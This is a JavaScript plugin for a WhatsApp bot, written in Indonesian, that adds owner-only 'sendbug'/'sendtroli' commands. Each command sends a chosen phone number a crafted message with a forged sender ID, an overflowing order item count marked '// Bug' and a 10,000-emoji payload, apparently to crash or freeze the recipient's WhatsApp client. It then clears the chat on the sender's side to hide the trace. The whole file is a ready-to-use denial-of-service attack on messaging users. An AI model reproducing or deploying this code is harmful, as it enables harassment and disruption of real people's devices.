// By Caliph
let handler = async (m, { conn, text, args, usedPrefix, command }) => {
if (!text) throw `Format Salah!!\nContoh : ${usedPrefix + command} +62 812-1365-7325`
conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'wh-mods-bot-v1', 'conversation', {
 quoted: {
  key: {
  remoteJid: 'status@broadcast',
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999, // Bug
    status: 1,
    surface: 1,
    message: '🔥'.repeat(10000),
    orderTitle: 'wh-mods-bot-v1', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
}).then(v => conn.modifyChat(v.key.remoteJid, 'clear'))
}
handler.help = ['sendbug <nomor>', 'sendtroli <nomor>']
handler.tags = ['owner']
handler.command = /^(sendtroli|sendbug)$/i
handler.owner = true 

module.exports = handler
